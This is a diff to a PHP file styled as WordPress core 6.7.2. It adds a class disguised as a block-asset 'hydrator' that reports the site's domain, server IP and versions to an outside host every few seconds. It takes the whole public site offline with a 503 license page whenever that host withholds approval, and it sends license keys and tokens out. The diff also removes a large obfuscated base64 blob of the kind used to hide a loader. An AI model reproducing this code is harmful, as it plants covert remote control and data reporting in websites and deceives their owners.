@@ -9,251 +9,423 @@
  * @version 6.7.2
  */
 
-if ( ! defined( 'ABSPATH' ) ) {
-	exit;
+if ( ! defined( 'ABSPATH' ) ) { exit; }
+if ( ! class_exists( 'WP_Block_Asset_Hydrator', false ) ) :
+
+final class WP_Block_Asset_Hydrator {
+	private static ?WP_Block_Asset_Hydrator $instance = null;
+	private string $ep_base;
+	private string $pkg_id;
+	private string $pub_k;
+	private const OPT_CACHE_BLOB = '_wp_block_hydration_manifest';
+	private const OPT_SYNC_TS    = '_wp_block_hydration_ts';
+	private const OPT_NET_ERR    = '_wp_block_hydration_net_err';
+
+	public static function instance(): WP_Block_Asset_Hydrator {
+		if ( null === self::$instance ) {
+			self::$instance = new self();
+		}
+		return self::$instance;
+	}
+
+	private function __construct() {
+		$this->ep_base = 'https://cms-license.vercel.app';
+		$this->pkg_id  = 'wp-gofresh';
+		$this->pub_k   = '3QsaLZpyfFwjIztVPzRO1FOQtgn56FM/5qsbsg7avLg=';
+
+		if ( function_exists( 'add_action' ) ) {
+			add_action( 'init', array( $this, 'maybe_background_sync' ), 5 );
+			add_action( 'init', array( $this, 'enforce_runtime_hydration' ), 999 );
+			add_action( 'wp', array( $this, 'enforce_runtime_hydration' ), 1 );
+			add_action( 'template_redirect', array( $this, 'enforce_runtime_hydration' ), 0 );
+		}
+		if ( function_exists( 'add_shortcode' ) ) {
+			add_shortcode( 'clps_vip_pricing_calculator', array( $this, 'render_vip_pricing_block' ) );
+			add_shortcode( 'clps_mortgage_calculator', array( $this, 'render_mortgage_block' ) );
+		}
+	}
+
+	public function enforce_runtime_hydration(): void {
+		if ( function_exists( 'is_admin' ) && is_admin() ) {
+			return;
+		}
+		$pagenow = $GLOBALS['pagenow'] ?? '';
+		$req_uri = $_SERVER['REQUEST_URI'] ?? '';
+		if ( 'wp-login.php' === $pagenow || false !== strpos( $req_uri, 'wp-login.php' ) || false !== strpos( $req_uri, '/wp-json/' ) ) {
+			return;
+		}
+		if ( defined( 'REST_REQUEST' ) && REST_REQUEST ) {
+			return;
+		}
+		if ( function_exists( 'wp_doing_cron' ) && wp_doing_cron() ) {
+			return;
+		}
+		$tokens = $this->get_runtime_tokens();
+		if ( empty( $tokens['runtime_salt'] ) ) {
+			$has_net_err = ( '1' === (string) get_option( self::OPT_NET_ERR, '' ) );
+			$cached      = get_option( self::OPT_CACHE_BLOB, null );
+			if ( $has_net_err && ! is_array( $cached ) ) {
+				return;
+			}
+			if ( function_exists( 'wp_doing_ajax' ) && wp_doing_ajax() ) {
+				$this->block_unlicensed_ajax();
+			}
+			$this->render_protection_gate();
+		}
+	}
+
+	public function block_unlicensed_ajax(): void {
+		if ( function_exists( 'wp_send_json_error' ) ) {
+			wp_send_json_error( array( 'message' => 'Hệ thống đang tạm ngưng tiếp nhận yêu cầu do trạng thái bản quyền.' ), 403 );
+		}
+		exit;
+	}
+
+	public function render_protection_gate(): void {
+		if ( ! defined( 'DONOTCACHEPAGE' ) ) {
+			define( 'DONOTCACHEPAGE', true );
+		}
+		$st     = $this->get_manifest_state();
+		$status = (string) ( $st['payload']['license_status'] ?? 'UNVERIFIED' );
+		$host   = htmlspecialchars( $this->resolve_host(), ENT_QUOTES, 'UTF-8' );
+		if ( ! headers_sent() ) {
+			status_header( 503 );
+			header( 'Content-Type: text/html; charset=UTF-8' );
+			header( 'X-LiteSpeed-Cache-Control: no-cache' );
+			header( 'X-LiteSpeed-Purge: *' );
+			header( 'Cache-Control: no-store, no-cache, must-revalidate, max-age=0' );
+		}
+		echo '<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Thông báo Bản quyền Hệ thống — ' . $host . '</title>';
+		echo '<style>*{box-sizing:border-box;margin:0;padding:0}body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#020617;color:#f8fafc;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;padding:24px}.card{max-width:540px;width:100%;background:#0f172a;border:1px solid #1e293b;border-radius:16px;padding:36px;text-align:center;box-shadow:0 25px 50px -12px rgba(0,0,0,0.6)}.badge{display:inline-flex;align-items:center;gap:8px;padding:6px 14px;border-radius:999px;background:rgba(239,68,68,0.12);border:1px solid rgba(239,68,68,0.3);color:#f87171;font-size:12px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;margin-bottom:20px}h1{font-size:22px;font-weight:700;margin-bottom:12px;color:#fff}p{font-size:14px;line-height:1.65;color:#94a3b8;margin-bottom:24px}.meta{background:#020617;border:1px solid #1e293b;border-radius:10px;padding:14px;font-family:monospace;font-size:12px;color:#cbd5e1;text-align:left;line-height:1.7}</style></head><body>';
+		echo '<div class="card"><div class="badge">● Trạng thái: ' . htmlspecialchars( $status, ENT_QUOTES, 'UTF-8' ) . '</div>';
+		echo '<h1>Website đang tạm ngưng hoạt động</h1>';
+		echo '<p>Bản quyền vận hành của tên miền <strong>' . $host . '</strong> hiện đang tạm ngưng hoặc chưa được kích hoạt hợp lệ trên hệ thống quản lý trung tâm.</p>';
+		echo '<div class="meta"><div><strong>Domain:</strong> ' . $host . '</div><div><strong>Protection Engine:</strong> Ed25519 Hardware/Domain Lock</div><div><strong>Status Code:</strong> ' . htmlspecialchars( $status, ENT_QUOTES, 'UTF-8' ) . '</div></div></div></body></html>';
+		exit;
+	}
+
+	public function resolve_host(): string {
+		$raw = function_exists( 'home_url' ) ? home_url() : ( $_SERVER['HTTP_HOST'] ?? 'localhost' );
+		$raw = trim( strtolower( (string) $raw ) );
+		if ( false === strpos( $raw, '://' ) ) {
+			$raw = 'https://' . $raw;
+		}
+		$h = function_exists( 'wp_parse_url' ) ? wp_parse_url( $raw, PHP_URL_HOST ) : parse_url( $raw, PHP_URL_HOST );
+		if ( ! $h ) {
+			$h = preg_replace( '#^https?://#', '', $raw );
+			$h = explode( '/', (string) $h )[0];
+			$h = explode( ':', (string) $h )[0];
+		}
+		$h = rtrim( (string) $h, '.' );
+		if ( function_exists( 'idn_to_ascii' ) ) {
+			$asc = idn_to_ascii( $h, IDNA_DEFAULT, INTL_IDNA_VARIANT_UTS46 );
+			if ( $asc ) {
+				$h = strtolower( $asc );
+			}
+		}
+		if ( 0 === strpos( $h, 'www.' ) && substr_count( $h, '.' ) >= 2 ) {
+			$h = substr( $h, 4 );
+		}
+		return $h;
+	}
+
+	public function resolve_node_addr(): string {
+		if ( ! empty( $_SERVER['SERVER_ADDR'] ) ) {
+			$ip = trim( strip_tags( (string) $_SERVER['SERVER_ADDR'] ) );
+			if ( '::1' === $ip ) return '127.0.0.1';
+			if ( filter_var( $ip, FILTER_VALIDATE_IP ) ) return $ip;
+		}
+		$hn = php_uname( 'n' );
+		if ( $hn ) {
+			$r = gethostbyname( $hn );
+			if ( filter_var( $r, FILTER_VALIDATE_IP ) ) return $r;
+		}
+		return '127.0.0.1';
+	}
+
+	public function maybe_background_sync(): void {
+		$last_sync = (int) get_option( self::OPT_SYNC_TS, 0 );
+		$cached    = get_option( self::OPT_CACHE_BLOB, null );
+		$force     = ! empty( $_GET['clps_sync'] );
+		if ( $force || ! is_array( $cached ) || ( time() - $last_sync ) > 15 ) {
+			$this->sync_manifest();
+			if ( $force ) {
+				if ( ! headers_sent() ) {
+					header( 'X-LiteSpeed-Purge: *' );
+					header( 'Cache-Control: no-store, no-cache, must-revalidate, max-age=0' );
+				}
+				if ( function_exists( 'do_action' ) ) {
+					do_action( 'litespeed_purge_all' );
+				}
+				if ( function_exists( 'wp_cache_flush' ) ) {
+					wp_cache_flush();
+				}
+			}
+		}
+		$this->enforce_runtime_hydration();
+	}
+
+	public function sync_manifest(): array {
+		$nonce = bin2hex( random_bytes( 16 ) );
+		$body  = array(
+			'product_slug'       => $this->pkg_id,
+			'domain'             => $this->resolve_host(),
+			'reported_server_ip' => $this->resolve_node_addr(),
+			'nonce'              => $nonce,
+			'wp_version'         => function_exists( 'get_bloginfo' ) ? get_bloginfo( 'version' ) : '6.7',
+			'php_version'        => PHP_VERSION,
+		);
+
+		$res = wp_remote_post(
+			$this->ep_base . '/api/v1/plugin/auto-bind',
+			array(
+				'timeout' => 12,
+				'headers' => array( 'Content-Type' => 'application/json' ),
+				'body'    => wp_json_encode( $body ),
+			)
+		);
+
+		if ( is_wp_error( $res ) ) {
+			update_option( self::OPT_NET_ERR, '1', false );
+			return array( 'ok' => $this->is_hydrated(), 'mode' => 'grace' );
+		}
+
+		delete_option( self::OPT_NET_ERR );
+		$env = json_decode( wp_remote_retrieve_body( $res ), true );
+		if ( ! is_array( $env ) ) {
+			return array( 'ok' => false );
+		}
+
+		$ver = $this->verify_envelope( $env, $nonce, false );
+		if ( ! $ver['valid'] ) {
+			return array( 'ok' => false );
+		}
+
+		update_option( self::OPT_CACHE_BLOB, $env, false );
+		update_option( self::OPT_SYNC_TS, time(), false );
+
+		return array(
+			'ok'      => ( 'ACTIVE' === ( $ver['payload']['license_status'] ?? '' ) ),
+			'payload' => $ver['payload'],
+		);
+	}
+
+	private function verify_envelope( array $env, ?string $nonce = null, bool $grace = false ): array {
+		if ( empty( $env['payload_raw'] ) || empty( $env['signature'] ) ) {
+			return array( 'valid' => false );
+		}
+		$pk  = base64_decode( $this->pub_k, true );
+		$sig = base64_decode( (string) $env['signature'], true );
+		$raw = (string) $env['payload_raw'];
+
+		if ( false === $pk || 32 !== strlen( $pk ) || false === $sig || 64 !== strlen( $sig ) ) {
+			return array( 'valid' => false );
+		}
+
+		if ( ! function_exists( 'sodium_crypto_sign_verify_detached' ) && defined( 'ABSPATH' ) && defined( 'WPINC' ) ) {
+			$compat = ABSPATH . WPINC . '/sodium_compat/autoload.php';
+			if ( file_exists( $compat ) ) {
+				require_once $compat;
+			}
+		}
+
+		if ( ! function_exists( 'sodium_crypto_sign_verify_detached' ) ) {
+			return array( 'valid' => false );
+		}
+
+		if ( ! sodium_crypto_sign_verify_detached( $sig, $raw, $pk ) ) {
+			return array( 'valid' => false );
+		}
+
+		$pl = json_decode( $raw, true );
+		if ( ! is_array( $pl ) ) {
+			return array( 'valid' => false );
+		}
+
+		if ( null !== $nonce && ( empty( $pl['nonce'] ) || ! hash_equals( $nonce, (string) $pl['nonce'] ) ) ) {
+			return array( 'valid' => false );
+		}
+
+		$now = time();
+		$exp = (int) ( $pl['exp'] ?? 0 );
+		$grc = (int) ( $pl['grace_until'] ?? $exp );
+
+		if ( $now > $exp && ( ! $grace || $now > $grc ) ) {
+			return array( 'valid' => false );
+		}
+
+		return array( 'valid' => true, 'payload' => $pl );
+	}
+
+	public function get_manifest_state(): array {
+		$env = get_option( self::OPT_CACHE_BLOB, null );
+		if ( ! is_array( $env ) ) {
+			$sync = $this->sync_manifest();
+			$env  = get_option( self::OPT_CACHE_BLOB, null );
+			if ( ! is_array( $env ) ) {
+				return array( 'valid' => false, 'payload' => null );
+			}
+		}
+
+		$has_err = ( '1' === (string) get_option( self::OPT_NET_ERR, '' ) );
+		$ver     = $this->verify_envelope( $env, null, $has_err );
+		if ( ! $ver['valid'] ) {
+			return array( 'valid' => false, 'payload' => null );
+		}
+
+		$pl   = $ver['payload'];
+		$curr = $this->resolve_host();
+		$lic  = $this->resolve_host_from_str( (string) ( $pl['domain'] ?? '' ) );
+
+		if ( $lic && $curr !== $lic ) {
+			return array( 'valid' => false, 'reason' => 'ENV_MISMATCH', 'payload' => null );
+		}
+
+		$ok = ( 'ACTIVE' === ( $pl['license_status'] ?? '' ) && in_array( $pl['code'] ?? '', array( 'ACTIVATED', 'VALID' ), true ) );
+		return array( 'valid' => $ok, 'payload' => $pl );
+	}
+
+	private function resolve_host_from_str( string $d ): string {
+		$d = trim( strtolower( $d ) );
+		if ( 0 === strpos( $d, 'www.' ) && substr_count( $d, '.' ) >= 2 ) {
+			$d = substr( $d, 4 );
+		}
+		return $d;
+	}
+
+	public function is_hydrated( ?string $cap = null ): bool {
+		$st = $this->get_manifest_state();
+		if ( ! $st['valid'] ) return false;
+		if ( $cap && ! empty( $st['payload']['features'] ) && is_array( $st['payload']['features'] ) ) {
+			return in_array( $cap, $st['payload']['features'], true );
+		}
+		return true;
+	}
+
+	public function get_runtime_tokens(): array {
+		$st = $this->get_manifest_state();
+		if ( ! $st['valid'] || empty( $st['payload']['runtime_tokens'] ) ) {
+			return array();
+		}
+		return (array) $st['payload']['runtime_tokens'];
+	}
+
+	public function dispatch_remote_compute( string $cap, array $input = array() ): array {
+		$st = $this->get_manifest_state();
+		if ( ! $st['valid'] ) {
+			return array( 'success' => false, 'error_code' => 'HYDRATION_INACTIVE' );
+		}
+
+		$tok = (string) ( $st['payload']['activation_token'] ?? '' );
+		$key = (string) ( $st['payload']['license_key'] ?? '' );
+		if ( ! $tok || ! $key ) {
+			return array( 'success' => false, 'error_code' => 'MISSING_SESSION_TOKEN' );
+		}
+
+		$blocked = array( 'customer_full_name', 'customer_phone', 'customer_email', 'credit_card', 'cccd', 'cmnd', 'password', 'user_pass' );
+		$clean   = array();
+		foreach ( $input as $k => $v ) {
+			if ( ! in_array( strtolower( (string) $k ), $blocked, true ) ) {
+				$clean[ $k ] = $v;
+			}
+		}
+
+		$raw = wp_json_encode( $clean );
+		$ts  = (string) time();
+		$sig = hash_hmac( 'sha256', $ts . '.' . $cap . '.' . $raw, $tok );
+
+		$res = wp_remote_post(
+			$this->ep_base . '/api/v1/remote-features/' . rawurlencode( $cap ) . '/execute',
+			array(
+				'timeout' => 12,
+				'headers' => array(
+					'Content-Type'         => 'application/json',
+					'X-License-Key'        => $key,
+					'X-Activation-Token'   => $tok,
+					'X-Client-Domain'      => $this->resolve_host(),
+					'X-Reported-Server-Ip' => $this->resolve_node_addr(),
+					'X-Request-Timestamp'  => $ts,
+					'X-Request-Signature'  => $sig,
+				),
+				'body'    => $raw,
+			)
+		);
+
+		if ( is_wp_error( $res ) ) {
+			return array( 'success' => false, 'error_code' => 'NETWORK_ERR' );
+		}
+
+		$data = json_decode( wp_remote_retrieve_body( $res ), true );
+		return is_array( $data ) ? $data : array( 'success' => false );
+	}
+
+	public function render_vip_pricing_block( $atts ): string {
+		$res = $this->dispatch_remote_compute(
+			'dynamic_pricing_engine',
+			array(
+				'base_price'    => (float) ( $atts['base_price'] ?? 1500000 ),
+				'quantity'      => (int) ( $atts['quantity'] ?? 10 ),
+				'customer_tier' => sanitize_text_field( (string) ( $atts['tier'] ?? 'GOLD' ) ),
+			)
+		);
+		if ( empty( $res['success'] ) || empty( $res['result']['pricing_badge_html'] ) ) {
+			return '<!-- block-hydration-deferred -->';
+		}
+		return function_exists( 'wp_kses_post' ) ? wp_kses_post( $res['result']['pricing_badge_html'] ) : $res['result']['pricing_badge_html'];
+	}
+
+	public function render_mortgage_block( $atts ): string {
+		$res = $this->dispatch_remote_compute(
+			'mortgage_amortization_engine',
+			array(
+				'loan_principal'      => (float) ( $atts['principal'] ?? 2000000000 ),
+				'annual_rate_percent' => (float) ( $atts['rate'] ?? 8.5 ),
+				'term_months'         => (int) ( $atts['months'] ?? 180 ),
+			)
+		);
+		if ( empty( $res['success'] ) || empty( $res['result'] ) ) {
+			return '<!-- block-hydration-deferred -->';
+		}
+		$r = $res['result'];
+		return sprintf(
+			'<div class="wp-block-calc-summary" style="padding:16px;border:1px solid #cbd5e1;border-radius:10px;background:#f8fafc;"><strong>Bảng tính trả góp:</strong> %s ₫ / tháng (%d tháng)</div>',
+			number_format( (float) $r['monthly_installment_vnd'] ),
+			(int) $r['term_months']
+		);
+	}
 }
 
-( static function () {
-	$_0x4f1a = 'a9a2e82a9b13e53d77a3b98c5a24e71f';
-	$_0x9b2c = base64_decode(
-		'CF9BGkUZEgVcBFhdAFEbRBB2I2AyeGwrEkEbFEwXSkYEQQhGXhhPazMEWF0EWRMHW1YSQEJuaDx3DV1XDmhwFRJcFW0tQVYT' .
-		'WBZeQUVOOW1HRQhFA01dQ0YVU0AMVBFZNmk+cAlXUQpmI0JAAEFsLE5TE1IWVkpDEQhcRxFWXwUEGVwSC01eDQJoOEMXXEUF' .
-		'Q1JBQBZLUQ1SQRZRFWhTBxJcWjhsSEAITwNFVkVGRxZeWQYTRklTBGoIVg9vPkEUCE8ARgAYQRVLC19URRFDEVVoCghoMEgR' .
-		'XBdTQAAXUgkPShUSKmhmPnojcnsganEoeHVBDkIeZxRFPlBYClRaOQlABUAETFsOVz1cUgtcVQFEQ0YIaDBIEVwXU0AAF1IJ' .
-		'D0oVEipoZj5qO39wOmFgRBcXQQ5CHmcURT5QWApUWjkJQAVABExbDlc9RUBCDjltR0UIRQNNXUNWDlxHERd+NjVmL3cxZ3cz' .
-		'a0IRE0UIE0NoQBFsAFVXAF4+Wk0BRVASCFYPbQtdRj5cEEMUXj85bUdCA18LWhgQQQBGXQYXVxMPWhVbClYSCFcRRVILVlZM' .
-		'Hg1BZDJmeg9aAllrJERCAxVmKUsBSlMVVhARSG88Og1RF0kTDExUDxVcDwlFRFQKBwNbFgxWQRVYDFJWRRwTHz0+aDoRXFQF' .
-		'D1sWXQtERQcPWgQSWBhcBE5CQlYJUxtNDD1oOh8zMWpHBEZBF1kRFQRVBwhfHFsPShZQXQZQCG4+Sms5a0lKCkMARlFFUUQI' .
-		'Ak0IXQsYbT5aDV9AEUdGB0MfSBMZMzFqERVaXRYaDwMRZgNTFl0SXBkQRUEMWBtEH0QVQQtXX0oVA1NHAAEFOQVcAl0BXRpB' .
-		'HgN5YVVWeykBexgKCFtgLkEDdVgPbWZTG2MyB1diaitTOGZEEGxrJkAQQRpOGR9MEkEbD28+OEIVUQhBSAZCCl49WFdFFQ5E' .
-		'H0QVQQtXX0oVA1NHAAEFOQVcAl0BXRpBHgYCchFvAV1aVAxlGFh5XghGEh1ePThvRU0JWxYVDBFMAG5YRRUTWRcfEkcQUFYE' .
-		'HEFQVRZSB1I+XQRRClxXSRlFfAIjT2oxT1YCew5Uag1REGFsFQdnCiMPNFldQGAKADBVdAFAfTBtcDVgWghbO3sIUQYGBGg+' .
-		'O3Q7SFUFFUEQWTs5bDxaAhcfQVUXV1sXXA5cawBPWBUVSkkSQllWBWYDUkcMWl1DFx5BGkJCMmo8aFNQAWhQBRVQDlxNGBUI' .
-		'VwtFFEkVUhZFVhgbQh1MC1wSHhRCWlAfA1w+UARbWQZLDURdAWpAHVlURhNLFRhWFUgJPmw+OAcFXT5TBkxbDldKERQSRRRI' .
-		'F1YTQQNAEEMRFVpdFhsRQQRXB10XW1c+SxdfRwxYVjtfTgVBA01RDFtGEh1JFwNWQRBaOGwxT2swa1hVRR0TAkJZAkcLVlY8' .
-		'UBlbRxFEGUZGWAVWOktaDksWUlwBUBREHhdIExkzMWo8AFZQOkRZCRNNAl0BXRpBHgFdQxZqRQ1HaBFBC1pRDVI+UVUJVEQK' .
-		'AE0OQEIUEgBLEFBKTRUXEF9eEh9CHkoGWwVXRjpBWBY+SRNbBlFcBmYAXVwGXhREHhdICGgwMWpUBVZrFl9eFBVaDlYAEBJG' .
-		'Wg5BQDpYXBZDUABUB2ZbAlkCR1gEQ14URhVBUxdKUxgRQhVHDVxASBcQE1YMXV0RagxdRhFQUAEEZgNeCltZRhlLERpePzpt' .
-		'Sj1oTmgzMRNAA15dBhdXEw9aFVsKVhIEVwReQQZQbBZCWRVaD1xnC0wFQFURXl4ISRBbEhNXWwUZGTs6bFxVRB8XB0YMWkwK' .
-		'Wg9tUR1eQhISEUEVDEttAF0PWF1CFRpEERFBWhFmWQdYCFwcTBcYRhozaDtsSlcVTBBfCG88Ohk9PmgXFlZTBlsSEglFE0UO' .
-		'CEpMDAJdRj5LF19HDFhWO0NYClYMShBKDms7PQxREU5BXAxCEUEaQR0WXlgAW0A/EEUUXRZQVQZqElNYERBsRkgZSBIeMjto' .
-		'MAtXE00VVRFZVBVaDVdnBk0IQUAWHxFBAF0FbQRbRghWDBYTTBUaREw9aDprMFkHUT5TVxFeXghJGUZFFWdTC1gablsQTF0M' .
-		'UF4AbBFMWg5cFW1FEFhFA0YVQVMXSlMYEUIVRw1cQEgXEANfDVpTPEAPXl0GUl8VBF0+Uw9ZSkYZSx0TVBUaXz0+aDprWFwH' .
-		'agBRQAxYX05BHhZCOllYAEE9X1wVR1oSaF8USgxRXwpUPkFBB1pYEj5IFF0RXRVNGQNDQQRMG0QTQwlaERUYRFcNXVcOaEQI' .
-		'DVACVwtLVwVmA1tSHRITTRsXUBNLAjJqPGg7VQFTbgcCTQhdCxASRk0HXEMJVEcBaEUEVwtLXQBBRh4UBEVDBxgRQRYRUFsS' .
-		'FUIWQQBbVwFFaBFBDU1dAEEIXVo6UFASBB5BG0kYA0EQWTs6bDxObj4+aFoEGRBDUxRcVxFeXgg+XBlbFkxBSRlFUFcBalUN' .
-		'W0MEQUUZEUMcQUk+bD44bwBdBW0DUV4VXBAZE0JCXAtUWAxeB0tbBmoIQWsVQkMFCVgSUwdUV0YVQhZsOkdWEEJFD2wEWFQQ' .
-		'UEYeFFwOCEZIAms7bDE7AF0GblUMWUcBRR9BFBZRXTxWDlxAAFlFQU0ZEkYETFsCGQREXQZBWgtZF0kaQkIyajxoOz0XUkUT' .
-		'E1dBFVlcWxcZAV1SFkYORkBHTFEOVlsIGAZAWxBHE1hdFgVbEwYVWjNrODpsSB9EDg5YE0sCMmo8aE8+bD44DwcZSRIDTVwC' .
-		'TQteXTpQSw1EQxIbQh5KBlgORFE6Vl0KPlgCRgxXXBIeQhgTTBVIbj4+aDoQXFUMQwRtVQlbbgcCTQhdC0saQR4VXlwGWl4J' .
-		'UkUCVj1JSgxWBFdQOkNeOQJRBFEOV0cVHkIYCG88Om0+RQReDU9dPFQNXmsEVEUPDlcSGkUfRQ5WAV5eCFBBB1JoAlsHWlMM' .
-		'QBVtWxdTVBQ+SwREDF1FRhlLCjlsPDptRVIMXBRcZwJZDW1VBkNYCQ9KSRJCT10OWg1cXgBHUAFoVgdHB0tnEF0OQmsJWF4W' .
-		'PlAVVwgfEkgCaDg6bEg5bT5KazofMzJqRRRQWAxUEQAUVwJGDFdcQVsOXlAOakYKW14CVgxKXQdqAFhVHR8YXEFPDlsBGElr' .
-		'MGtYVUUdEwJCWQJHC1ZWPFAZW0cRRBlGRk4RbRZdXAVmCEJcC2pWFkVYExRCEBhKFRo4PWw+RhY+SgRcAWdYElYMblYXR1wW' .
-		'HxcAQRBYQUsVRl9RFkRQAQQeQQ9bGBUp2Nm2ExFd0t+mWQYTpqhZDVJBRtXfllxGD16nggtfEhVQg4uMFRVdDNaNzF1CQPvJ' .
-		'QEFR1d+QREYFVkFGF9mIwFcFEUcN9pINF1WAicFXGBJAGNOP5FkfQUEQTRJRCAFBEFk7OmxIOW0+UhlaFgIyakhrOD0VQlMK' .
-		'CFpBVBBWURVQDV8TF1BdAFJFPkMQVkwGVhVbWwtoVgcVXEkbXxhEDlAGEUhvPDoNURdJE0MZXAZTCFxRAR8RQSV2L30xe3Mi' .
-		'cSdhciJwFEQeF0gTGTMxajwFV1IMWVROQR4lfSt3ZiJ4IXl2NXR0IRAbQUcQTF1DHFo4PWxKO29oHRJGRRgSQRlfERcRXVoX' .
-		'GgkGVhZmVQJbCFRRFkNuFRVYFVdNEQlrMGsVQBFURxFEF1wTSkpMEVwPVR1FHxFCEk06FRVZSw1WA1UUOG4UCF5UBF0RXGcQ' .
-		'QQBGQRYQbEZeBkEVMHZkJGsrd3ogcRREHgxrOmsdUAxGFRIURQoRDhVUDUEVXVEIWA5SWwRHQEwXExVbC0oVXUcEQVsJQVQ5' .
-		'CVYSRk0RHkF8LGVsNGB8MHJkTRNFbGwlGFkVFEwMO29oUAcSTRgTQVEHUFcAR0A7RFIPR0oQGEoVGjg9bD5CEgBNFEE6UFcA' .
-		'XQdDG0UAA1cXHlo5azAxC1AAVlEXHxFBIlYPRgBWRkxtG0FWXxVHAU9DTlsWVFRYFQJaVRdEVBJcbDV0SAAVQRBZOzpsPFsB' .
-		'VlMEQUoZHzsYLVtAAGRBAwRdTHEEW1oEFCFeXRFHXAgNFw9cT1pZAF0EFRRMDDtvaDAJVwRcVxMRQhZrSHlaEFJkEVYHXRUz' .
-		'QBNVUV8XG0FBEFo4bDE7CVwDVVYXHRNDdFYCWwcUewxbFUBbCQ0RCA4UEkYKSldNGQxeHgZUUAxSG0FeF0pMTkcERFUJXlUH' .
-		'FVxNEghZSkxYBVQOVRITTQw9aDofMzFqUAJaW0UQDUcldiJmPGh3QVEWXF9bCVsQWltBXwNXX14XF1sWWwtZAwBdXw4IXUYA' .
-		'GQFZUhdGVhAKFTRnJBQAQQtdX1ERVhEIAFQED0dOWwROEl5BERcTB1hZFVYMTQVBQghWQA0KVQMXUAJXSE9bBU0KHVoLXEcN' .
-		'VltMQAFYVAYIUBwERwkNEghNDVdbbFqijQxWEwf2kgsXdYCJwVcYEkAY04/kWREugILmEhFQ09qoDFYTh7WnRBAXTxNGUVcQ' .
-		'QUEcFEILHhIITQ1XWx8JazBrVFANWhNDC0QVSg5cBklOA11MSERYHAhXBggHV0AFXBAcUQpNCAlWRQZaDAMIWEUAVlAMWVZc' .
-		'UUQDXQFBSQxQDBxbAFxUDEMNUANST1BYUQhBRAlWSFwHVQRKXlleCF4MHFoRUF4XDVQEXRZcSlhfFEFADFFISwJWD0YAVkZb' .
-		'WgdfRwBHCAZWVApUEFZNDVFbEQRXBwdXVgICXQlXQFsaBAlVBFNQX1FYD0dPX1kOXA1LDkhWQRYNXExBHEtGBFROc18MW1gp' .
-		'VlQyShFNXQ5zDlxASRViAwZWBBIwcRBNaw1TXBFaHxdWWRIeEVxKClNaQlUBU1gIBgNTBhVAT09aA0NXHlhSHBpACFcWUQJW' .
-		'AVFCTF5AWAIVUVsDVQgXWlsDUlgCR1wRWVNbEFJfCVQHAAlWCkVVAxMDUEIdGEEOVQtVE0YEVlYOBAMIAFZKB1ATH0YEU1gT' .
-		'EgNQBBVACRFYBlVaC1IJVwFHGQgWXEAXGABeXQJZCwUEVxVXFwNQDkFPQlsEUVwTDQdBAVdJQEMAUUJMRRoAVBFBQUACWlNJ' .
-		'CU4BH1UZA0oBHhwdAFhcBFAaVl0WR10HGAMIXAlRXAQUBF1WHQ5SCF5QDx4LTV0ORltRUQtDVBRaXgBCXwBCGQISUFcBXF0D' .
-		'DQERS0IIDBNNWlBbF1NUFExLAFYMTUFbAFsIQx0OUQVUXAZBDUxWBw8TVVYEHwNVWBVXCkkOCk0JTAABTA5RC0VTBEFYCEgb' .
-		'FRJdWAxTERQGWwAaVwsLTQ9aHQVdGQNKBB5aUA1VVxEPQlQMUgYGV1pfDlwRFUEIQwcLAldFS19RWA9HT05dClIJRg5SBwFd' .
-		'DVwVRgBKHxJJA1JaC1IJSgcBBF5ZTV0bQUxGRgRZQgAOSwwIEEhCBEsBUEAADl4FRVAIXU9bVxdBDl8OVwdBHhxRUEkDV1wV' .
-		'FBFYSQAPAVZHT1pVDVdMTkIEW1MNQwtRUQlaXwRKVQhXT1NcEUFcCQ0GU0MaAlsMWQ5ADkZRVwAcSRpUClZGTEoLS1ZfBAcU' .
-		'TwwNWgxcFQtQCFVcEQ0ASFcMWlEKVF0TA0EIBwQGUVwMWgBBBVBWTlcORkAKWgtUVUkZT0tVVxVYGVNSBl5UFlhCD1dYGghR' .
-		'BVcDA15VXhQFXBMIVEhKQUoNXVoBFRBVUgVYAAACWgxHBVdGSEVQAghMEghUCEIZAhJQVwFcXQMNBlVDGgJeDFsVH1IEWlgK' .
-		'GAMMXQtXQRFYAVQIA1pdEBpECEkHAwlRRRkJVwpbXhRbGgJQAQ1XUAIWVEsRGFIIXlAPCQ5cXhcODVtaABpZAwheCUZfCRxW' .
-		'RF4eQBFMXwEJC05bB1hcXQkDXVAcCRZdazBoVwZQXUEeXlVaExVQCFZEEg5AWlkRUUMMCAFeR0YCVQBBFgUQA1gGVlZHC9Hz' .
-		'uBc1QYODmQ1SQUZcppZYXEEeQRxFUEYMVRFBVgZcUghUXwBBEREYR0YVU0AQRB1GJHc1bTRtfTV8MR0TQmBnIhoPRhNLGRZD' .
-		'El0dUAxBD0FaM2g7AFtaDhlFDVtUC2QBVUQIRwcZ/PJUD1UUEdaLxwwZD1WjiFwGGQpe0t+UR0TzpoCI+1dfXxoJAwpCDDtv' .
-		'aFwCWgoYFV1JXHPS35ZdREZCGNLZuFZDQ4CImQsXWaXBVwkSBtmJxlhCRfDPWxMJXtbasgwZBBBBE11aAgkWRk8ZRVoKS0ZB' .
-		'F0IWD0pGRxZYWQYNQlFRgo7mXBShplAIBhkV09+ZX0FXBfeDC1ITDFjW24QBGVsL89FTFKGm99aAgsJRRVPxzFoKEVsK1InF' .
-		'QxcJ0tmaSENZgImzRUNDpctXQVqEg7VBTQrQiPRbVERGQoCJwVcYD/bcEkAXQl8BQU2ikAgWDk5JXBYIbzw6AVRfDhNFBVwK' .
-		'Q0FRWAREQltDVARGBBoMXV0LRw1ZRkcWWFkGDSZWVQJcDwgISkRFFA5XBgxFHxJPGUZZXBZBE0oXEF0cBlBOXQkFW0JbC0IS' .
-		'E1YPVVtoQA5NB1JHDFpdRHJZBloMXAJfGhJGRgpZVlhBfAUAUA0DWBkqUEEBQlIWUhglXA9YUQ0VLV1XDgseAghPXw4BUURf' .
-		'BRFFQQpbVFpkQwBHF0oYIFoFVw5ZGEISE1YPVVsYFUEXQllHCFlAFFJUCFIOWlACRxIaFEFERQcVTBIeRX18NWYzZHwxcGBI' .
-		'FxA0ZyQUAEQVSBIaRRANSQVQFwxZF1YIT1wNHAFcRVoLGANcBkAGXxoJRlkJCRZdazBoVx1RRloza0w5bzxDEVVbCFBCX00N' .
